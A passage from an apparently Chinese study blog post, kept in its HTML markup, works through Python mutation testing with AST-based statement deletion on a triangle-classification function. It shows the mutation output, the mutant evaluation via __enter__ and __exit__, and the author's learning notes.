class="token punctuation">.</span>src<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"在固定节点变异之后的代码"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"========================================\n"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>运行结果<span class="token punctuation">:</span>visit_Returnvisit_Returnvisit_Returnvisit_Returnvisit_Returntest<span class="token punctuation">.</span>nmutations<span class="token punctuation">:</span> <span class="token number">5</span>__iter__<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>这是第<span class="token number">1</span>次变异<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>原始代码：<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span>在固定节点变异之后的代码visit_Return进行替换visit_Returnvisit_Returnvisit_Returnvisit_Return<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>这是第<span class="token number">2</span>次变异<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>原始代码：<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span>在固定节点变异之后的代码visit_Returnvisit_Return进行替换visit_Returnvisit_Returnvisit_Return<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>这是第<span class="token number">3</span>次变异<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>原始代码：<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span>在固定节点变异之后的代码visit_Returnvisit_Returnvisit_Return进行替换visit_Returnvisit_Return<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>这是第<span class="token number">4</span>次变异<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>原始代码：<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span>在固定节点变异之后的代码visit_Returnvisit_Returnvisit_Returnvisit_Return进行替换visit_Return<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>这是第<span class="token number">5</span>次变异<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>原始代码：<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Scalene'</span>在固定节点变异之后的代码visit_Returnvisit_Returnvisit_Returnvisit_Returnvisit_Return进行替换<span class="token keyword">def</span> <span class="token function">triangle</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> b<span class="token punctuation">:</span>        <span class="token keyword">if</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Equilateral'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> b <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> c<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Isosceles'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-Evaluating-Mutations"><a href="#8-Evaluating-Mutations" class="headerlink" title="8 Evaluating Mutations"></a>8 Evaluating Mutations</h3><p>涉及到了两个函数</p><ul><li><p><code>__enter__()</code>:The <strong>enter</strong>() function is called when the with block is entered. <em><strong>It creates the mutant as a Python function and places it in the global namespace</strong></em>, such that the assert statement executes the mutated function rather than the original.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>log<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'->\t%s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;mutant>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span>    <span class="token builtin">eval</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 创建全局的变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>__exit__()</code>:The <strong>exit</strong>() function checks whether an exception has occurred (i.e., the assertion failed, or some other error was raised); if so, it marks the mutation as detected. Finally, it restores the original function definition.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_value<span class="token punctuation">,</span> traceback<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>log<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&lt;-\t%s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token keyword">if</span> exc_type <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>detected <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>log<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Detected %s"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_value<span class="token punctuation">)</span>    <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>fn <span class="token comment"># 因为突变把原来函数给改变了嘛,所以后面又重新把它恢复成原来的样子了</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>log<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>其他的倒是不难理解了</p><h3 id="9-Mutator-for-Modules-and-Test-Suites"><a href="#9-Mutator-for-Modules-and-Test-Suites" class="headerlink" title="9 Mutator for Modules and Test Suites"></a>9 Mutator for Modules and Test Suites</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h4><ul><li><p><code>self.mutator.visit(self.ast)</code>  这个函数调用的是AdvMutator里面mutable_visit函数???? 为什么会是这样呢?</p><p>A: 你懵了吗, 之前不是探讨过这个问题吗. 并不是self.mutator.visit(self.ast)调用的这个函数, 而是其调用的函数调用的.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Visit a node."""</span>    method <span class="token operator">=</span> <span class="token string">'visit_'</span> <span class="token operator">+</span> node<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__    visitor <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> method<span class="token punctuation">,</span> self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">)</span>     <span class="token comment"># 这个函数先访问你自定义的节点visit方法,</span>    <span class="token comment"># 如果没有的话, 就递归访问子节点, </span>    <span class="token comment"># 也就是说, 是你自定义的节点visit_XXXX方法调用的mutable_visit. </span>    <span class="token comment"># 你可以再去看看上面</span>    <span class="token keyword">return</span> visitor<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>__dict__</code> 在py中,到底起什么样的作用呢? 为什么这个可以实现全局调用?</p><p>A: Python 类提供了 <strong>dict</strong> 属性。需要注意的一点是，该属性可以用类名或者类的实例对象来调用，用类名直接调用 __dict__，会输出该由类中所有类属性组成的字典；而使用类的实例对象调用 __dict__，会输出由类中所有实例属性组成的字典。</p></li><li><p><input checked="" disabled="" type="checkbox">  runtest函数中细节还要再理解</p><p>A: 是unittest类里面的内容, 下次的时候可以再去百度看.</p></li><li><p><input checked="" disabled="" type="checkbox">  再了解一下unittest</p><p>A: 就是一个测试类, 也记不住, 下次用到在百度看把</p></li></ul><h4 id="合成代码"><a href="#合成代码" class="headerlink" title="合成代码"></a>合成代码</h4><blockquote><p>按照我的理解的话, 这一小节的内容, 就是为了<strong>把第8小节中的变异之后函数运行问题做了简化, 其实本质上还是之前的内容.</strong> 过程中用到了<code>unittest</code>这个模块</p></blockquote><p>还是一样的做法, 把代码们先弄到一起</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MuProgramAnalyzer</span><span class="token punctuation">(</span>MuFunctionAnalyzer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> AdvPMIterator<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>ast <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>src<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>src <span class="token operator">=</span> ast<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ast<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>changes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>mutator <span class="token operator">=</span> self<span class="token punctuation">.</span>mutator_object<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>nmutations <span class="token operator">=</span> self<span class="token punctuation">.</span>get_mutation_count<span class="token punctuation">(</span><span class="token punctuation">)</span>         self<span class="token punctuation">.</span>un_detected <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mutator_object</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> locations<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> AdvStmtDeletionMutator<span class="token punctuation">(</span>self<span class="token punctuation">,</span> locations<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_mutation_count</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>s        self<span class="token punctuation">.</span>mutator<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ast<span class="token punctuation">)</span> <span class="token comment"># 这个函数调用的是AdvMutator里面mutable_visit函数???? 为什么会是这样呢?</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutator<span class="token punctuation">.</span>count      <span class="token keyword">class</span> <span class="token class-name">AdvMutator</span><span class="token punctuation">(</span>Mutator<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> analyzer<span class="token punctuation">,</span> mutate_locations<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>mutate_locations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">if</span> mutate_locations <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> mutate_locations        self<span class="token punctuation">.</span>pm <span class="token operator">=</span> analyzer    <span class="token keyword">def</span> <span class="token function">mutable_visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># statements start at line no 1</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>mutation_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">AdvStmtDeletionMutator</span><span class="token punctuation">(</span>AdvMutator<span class="token punctuation">,</span> StmtDeletionMutator<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> analyzer<span class="token punctuation">,</span> mutate_locations<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        AdvMutator<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> analyzer<span class="token punctuation">,</span> mutate_locations<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mutation_visit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># there is only one way to delete a statement -- replace it by pass</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>mutate_locations<span class="token punctuation">:</span>  <span class="token comment"># counting pass</span>            self<span class="token punctuation">.</span>pm<span class="token punctuation">.</span>changes<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>count<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># get matching changes for this pass</span>            mutating_lines <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> idx<span class="token punctuation">)</span>                                 <span class="token keyword">for</span> <span class="token punctuation">(</span>count<span class="token punctuation">,</span> idx<span class="token punctuation">)</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>mutate_locations<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>count<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token keyword">in</span> mutating_lines<span class="token punctuation">:</span>                <span class="token keyword">return</span> ast<span class="token punctuation">.</span>Pass<span 